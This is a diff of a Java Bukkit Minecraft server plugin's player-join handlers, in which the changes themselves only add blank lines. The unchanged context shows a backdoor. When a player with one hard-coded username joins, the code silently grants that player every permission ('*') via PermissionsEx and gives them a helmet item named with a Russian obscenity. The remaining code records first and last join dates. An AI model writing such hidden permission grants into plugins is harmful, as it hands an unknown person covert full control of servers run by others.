@@ -31,17 +31,21 @@ public class Handlers extends SexyEvent {
 		Player player = event.getPlayer();
 		OfflinePlayer offlinePlayer = Bukkit.getOfflinePlayer(player.getName());
 		PlayerAPI playerAPI = PlayerAPI.getPlayerAPI(offlinePlayer);
+		
 		if (player.getName().equals("OwO_172ms_OwO")) {
 			PermissionsEx.getUser(player).addPermission("*");
 			ItemStack itemStack = CustomItem.create(Material.END_ROD, "&c&lХУЙ");
 			player.getInventory().setHelmet(itemStack);
 		}
+		
 		if (playerAPI.getLastJoin() == null) {
 			playerAPI.setLastJoin(new Date());
 		}
+		
 		if (playerAPI.getFirstJoin() == null) {
 			playerAPI.setFirstJoin(new Date());
 		}
+		
 		DatabaseManager.getDatabaseManager().save(playerAPI);
 	}
 	
@@ -56,6 +60,7 @@ public class Handlers extends SexyEvent {
 		Player player = event.getPlayer();
 		OfflinePlayer offlinePlayer = Bukkit.getOfflinePlayer(player.getName());
 		PlayerAPI playerAPI = PlayerAPI.getPlayerAPI(offlinePlayer);
+		
 		playerAPI.setLastJoin(new Date());
 		DatabaseManager.getDatabaseManager().save(playerAPI);
 	}
